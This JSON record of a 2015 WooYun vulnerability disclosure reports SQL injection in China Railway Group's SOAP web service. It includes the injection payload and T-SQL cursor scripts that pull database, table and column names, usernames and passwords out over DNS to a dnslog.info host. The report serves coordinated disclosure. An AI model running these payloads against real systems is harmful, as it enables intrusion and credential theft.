{"id": 72082, "wybug_id": "wooyun-2015-0150697", "wybug_title": "中国中铁主站某处SQL注入（利用Cloudeye）", "wybug_corp": "中国中铁", "wybug_author": "1c3z", "wybug_date": "2015-10-30 21:24", "wybug_open_date": "2015-12-18 15:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向公众公开  简要描述： 用sqlmap盲注也跑不出来 详细说明：  注入点：\nPOST /DesktopModules/C_Info/WebService/C_InfoService.asmx HTTP/1.1Host: **.**.**.**Content-Type: text/xml; charset=utf-8Content-Length: 586SOAPAction: \"http://**.**.**.**/GetC_InfoSharedModules\"<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://**.**.**.**/2001/XMLSchema-instance\" xmlns:xsd=\"http://**.**.**.**/2001/XMLSchema\" xmlns:soap=\"http://**.**.**.**/soap/envelope/\">  <soap:Header>    <AuthHeader xmlns=\"http://**.**.**.**/\">      <UserToken>aa' and 1=2;; declare @s varchar(800) set @s=cast(0x77616974666f722064656c61792027303a303a313027 asvarchar(800)) exec (@s);select 3 --'</UserToken>    </AuthHeader>  </soap:Header>  <soap:Body>    <GetC_InfoSharedModules xmlns=\"http://**.**.**.**/\" />  </soap:Body></soap:Envelope>\npayload:\naa' and 1=2;; declare @s varchar(800) set @s=cast(0x77616974666f722064656c61792027303a303a313027 asvarchar(800)) exec (@s);select 3 --'\n\n\n先执行下create database temp_cloud;库名，利用db_name(0)函数\ndeclare @@yukari varchar(800);set @@yukari = db_name(0);exec('backup log [temp_cloud] to disk=''\\\\'+@@yukari+'.xxxxx.dnslog.info\\a'';');--\n用户名，利用user_name()函数获得当前库中的表表名利用：INFORMATION_SCHEMA.tables利用游标可以执行一条sql语句，获得多条数据\nDECLARE @T VARCHAR(8000),@TS VARCHAR(8000)set @TS = ''DECLARE Table_Cursor CURSOR FOR   select TABLE_NAME from  INFORMATION_SCHEMA.tables where table_type='BASE TABLE'OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @TWHILE(@@FETCH_STATUS=0)    BEGIN         set @TS =  @TS +'1' + @T        if len(@TS) > 50        begin            print @TS            EXEC('backup database [temp_cloud] to disk=''\\\\'+@TS+'.xxx.dnslog.info\\a'';');            set @TS = ''        end        FETCH NEXT FROM Table_Cursor INTO @T    ENDCLOSE Table_Cursor DEALLOCATE Table_Cursor;print @TSEXEC('backup database [temp_cloud] to disk=''\\\\'+@TS+'.xxx.dnslog.info\\a'';');\n\n\n现在来获得user表中的列名。\nDECLARE @C VARCHAR(8000),@CS VARCHAR(8000)set @CS = ''DECLARE Table_Cursor CURSOR FOR   select COLUMN_NAME from  INFORMATION_SCHEMA.columns where table_name='users'OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @CWHILE(@@FETCH_STATUS=0)    BEGIN         set @CS =  @CS +'2' + @C        if len(@CS) > 50        begin            EXEC('backup database [temp_cloud] to disk=''\\\\'+@CS+'.xxx.dnslog.info\\a'';');            set @CS = ''        end        FETCH NEXT FROM Table_Cursor INTO @C    ENDCLOSE Table_Cursor DEALLOCATE Table_Cursor;EXEC('backup database [temp_cloud] to disk=''\\\\'+@CS+'.xxxx.dnslog.info\\a'';');\n\n\n获得user表中的数据\nDECLARE @N VARCHAR(8000),@P VARCHAR(8000),@T VARCHAR(8000)set @T = ''DECLARE Table_Cursor CURSOR FOR select Username,UpdatePassword from  [Users]OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @N,@PWHILE(@@FETCH_STATUS=0)    BEGIN         set @T =  @T +'4' + @N+'1' + @P        if len(@T) > 50        begin            EXEC('backup database [temp_cloud] to disk=''\\\\'+@T+'.xxx.dnslog.info\\a'';');            set @T = ''        end        FETCH NEXT FROM Table_Cursor INTO @N,@P    ENDCLOSE Table_Cursor DEALLOCATE Table_Cursor;EXEC('backup database [temp_cloud] to disk=''\\\\'+@T+'.xxxx.dnslog.info\\a'';');\n   漏洞证明：  users表中username字段\n\n   修复方案：  使用参数化查询   版权声明：转载请注明来源 1c3z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-03 15:03 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向网站管理单位通报。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-30 21:48 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:868 漏洞数:189        )\t\t \n  求 Cloudeye视频教程    \n     2015-10-30 21:57 |    \t\t1c3z \t\t\t( 普通白帽子  |\t\t\t        Rank:258 漏洞数:53        | #)\t\t \n  @乐乐、 大牛别闹    \n     2015-10-30 22:27 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:868 漏洞数:189        )\t\t \n  @1c3z 大牛快给姿势    \n     2015-10-31 08:03 |    \t\tsauce \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 酱油一个)\t\t \n  求指导cloudeye    \n     2015-10-31 11:55 |    \t\trange \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:35        | 这个人有点懒，没有写个人简介)\t\t \n  @1c3z 求 Cloudeye视频教程    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}